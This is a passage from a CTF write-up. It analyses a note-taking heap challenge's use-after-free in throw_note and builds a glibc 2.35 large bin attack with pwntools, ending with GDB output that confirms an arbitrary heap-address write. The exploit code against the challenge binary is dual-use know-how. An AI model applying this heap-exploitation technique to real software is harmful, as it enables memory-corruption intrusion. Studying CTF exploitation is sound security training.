</code></pre></div><p>It is a fairly extensive function because it has to cover many cases. Simplifying, it allows us to edit a note of the 4 possible and ask us exactly what part we want to edit: header, text or footer. Each of these three can only be edited once. And if we chose header or footer, we will have to choose a particular field: name, surname, date or city (in the case of the footer).</p><p>As a control, the function verifies if the note is really written and if there is a reference in the global array.</p><h3 id="read-function">Read function</h3><p>This is <code>read_note</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span>
<span class="mtk8">read_note</span><span class="mtk1">(){</span>
<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">idx</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"What is the index of the note you want to read?"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">print_note_idxs</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk8">MAX_NOTES</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk8">NULL</span><span class="mtk1"> ){</span>  
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid note!!"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Note [</span><span class="mtk6">%d</span><span class="mtk4">]</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk1">idx</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Header"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"-----------------------------"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">print_header</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"-----------------------------"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">is_freed</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Text: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">);</span>
<span class="mtk1">    }</span><span class="mtk5">else</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Text: --DELETED--"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">footer</span><span class="mtk1"> </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk8">NULL</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Footer"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"-------------------------------"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">print_footer</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">footer</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>With this function we can read the data of a specific note. If it happens that this note is freed, only the header and footer will be displayed (if it has it), but the text part will not be displayed.</p><h3 id="free-function">Free function</h3><p>Finally, we have the option to delete notes:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span>
<span class="mtk8">throw_note</span><span class="mtk1">(){</span>
<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">idx</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">available</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">available_notes_throw</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">available</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"There are no more pages left to tear bro</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"What is the index of the note you want to throw t</span><span class="mtk4">o the bin?"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">print_note_idxs</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk8">MAX_NOTES</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">is_freed</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk8">NULL</span><span class="mtk1"> ){</span>  
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid note!!"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">is_freed</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">true</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"3-pointer in the bin!!"</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>This function simply calls <code>free</code> to release the chunk. The problem with this function is that it does not erase the reference to the note in the global array. Therefore, although the chunk is freed, we can still access it and use functions such as <code>read_note</code> or <code>edit_note</code>, which do not properly check if the chunk is freed. With this, we have a Use After Free vulnerability.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>First, we must taken into account that the Glibc version that we have to exploit is 2.35 (Ubuntu 22.04). As it is a heap exploitation challenge, a good idea is to look for some useful technique in <a target="_blank" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35">how2heap</a>.</p><p>Another fact to consider is how notes are stored as chunks in the heap:</p><p><img alt="La casa de papel 1" src="/images/other/HackOn%20CTF/La-casa-de-papel-1.webp"></p><h3 id="large-bin-attack">Large Bin attack</h3><p>Knowing this, looking at the different techniques of <a target="_blank" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35">how2heap</a> that are applicable to Glibc 2.35, we find the <a target="_blank" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c">Large Bin attack</a>. The context and the nature of this attack fits perfectly with the proof of concept that appears in the repository. Even the sizes of the chunks that we ara allowed to use, with the guard chunks (of size <code>0x20</code>) to avoid consolidations when necessary. Everything fits.</p><p>The result of this attack is the possibility of writing a heap address (fixed) in an arbitrary memory address. By itself, it is not a very powerful attack, since it is necessary to leverage the limited write primitive.</p><p>The attack procedure is well documented in the repository, but it is basically as follows:</p><ol><li>Allocate a chunk (<code>p1</code>) of size <code>0x430</code> with a guard chunk (<code>g1</code>)</li><li>Allocate a chunk (<code>p2</code>) of size <code>0x420</code> with a guard chunk (<code>g2</code>)</li><li>Free <code>p1</code></li><li>Allocate a chunk (<code>p3</code>) of size <code>0x440</code></li><li>Free <code>p2</code></li><li>Modify the <code>bk_nextsize</code> field of <code>p1</code> ans set the address where we want to write (minus <code>0x20</code>). This can be done with a Use After Free</li><li>Allocate a chunk (<code>p4</code>) of size <code>0x440</code></li></ol><p>At this point, we will have the address of chunk <code>p2</code> set in the address we wanted to write.</p><h2 id="exploit-development">Exploit development</h2><p>First, we will use the following auxiliary functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">SMALL</span><span class="mtk1">, </span><span class="mtk1">MEDIUM</span><span class="mtk1">, </span><span class="mtk1">LARGE</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">2</span>
<span class="mtk1">WITHOUT_FOOTER</span><span class="mtk1">, </span><span class="mtk1">WITH_FOOTER</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">1</span>
<span class="mtk1">TEXT</span><span class="mtk1">, </span><span class="mtk1">FOOTER</span><span class="mtk1">, </span><span class="mtk1">HEADER</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">2</span>
<span class="mtk1">NAME</span><span class="mtk1">, </span><span class="mtk1">SURNAME</span><span class="mtk1">, </span><span class="mtk1">DATE</span><span class="mtk1">, </span><span class="mtk1">CITY</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">3</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">size</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">footer</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">, </span><span class="mtk9 mtki">surname</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">, </span><span class="mtk9 mtki">date</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">, </span><span class="mtk9 mtki">city</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">, </span><span class="mtk9 mtki">text</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>  
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">size</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">footer</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">surname</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">date</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">city</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">text</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">place</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">field</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">place</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">place</span><span class="mtk1"> </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk1">TEXT</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">field</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>

<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'What would you like to do?'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">throw</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
</code></pre></div><p>The Large bin attack can be implemented in this challenge in a very simple way:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">io</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk1">MEDIUM</span><span class="mtk1">, </span><span class="mtk1">WITH_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk1">SMALL</span><span class="mtk1">, </span><span class="mtk1">WITH_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">throw</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk1">LARGE</span><span class="mtk1">, </span><span class="mtk1">WITHOUT_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk1">HEADER</span><span class="mtk1">, </span><span class="mtk1">CITY</span><span class="mtk1">, p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">406600</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk8">throw</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk1">LARGE</span><span class="mtk1">, </span><span class="mtk1">WITHOUT_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>If we execute it, the program does not break:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './chall'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 402081
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '402081', '-x', '/tmp/pwnsrwco9g4.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Switching to interactive mode
Note created with index 3

What would you like to do?
[0] Create new note.
[1] Edit existing note.
[2] Read existing note.
[3] Throw note to the bin.
[4] Exit.
&gt;<span class="code-red">$</span>
</code></pre></div><p>In addition, in GDB we see that the address we have indicated contains an address of the heap, specifically, the one from chunk <code>p2</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/gx 0x406600
<span class="code-dark-blue">0x406600</span>:       0x00000000020616e0
<span class="code-green">gef&gt; </span>chunks
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x2061000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x2061290</span>, size=<span class="code-magenta">0x430</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x0000020616e0</span>, bk=<span class="code-dark-green">0x7f544ec300d0</span>, fd_nextsize=<span class="code-dark-blue">0x000002061290</span>, bk_nextsize=<span class="code-dark-blue">0x0000020616e0</span>)<span class="code-blue">  &lt;-  largebins[idx=63,sz=0x400-0x440][1/2]</span>  
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x20616c0</span>, size=<span class="code-magenta">0x20</span>, flags=)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x20616e0</span>, size=<span class="code-magenta">0x420</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7f544ec300d0</span>, bk=<span class="code-dark-blue">0x000002061290</span>, fd_nextsize=<span class="code-dark-blue">0x000002061290</span>, bk_nextsize=<span class="code-dark-green">0x0000004065e0</span>)<span class="code-blue">  &lt;-  largebins[idx=63,sz=0x400-0x440][2/2]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x2061b00</span>, size=<span class="code-magenta">0x20</span>, flags=)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x2061b20</span>, size=<span class="code-magenta">0x440</span>, flags=<span class="code-red">PREV_INUSE</span>)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x2061f60</span>, size=<span class="code-magenta">0x440</span>, flags=<span class="code-red">PREV_INUSE</span>)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x20623a0</span>, size=<span class="code-magenta">0x1fc60</span>, flags=<span class="code-red">PREV_INUSE</span>) <span class="code-blue"> &lt;-  top</span>
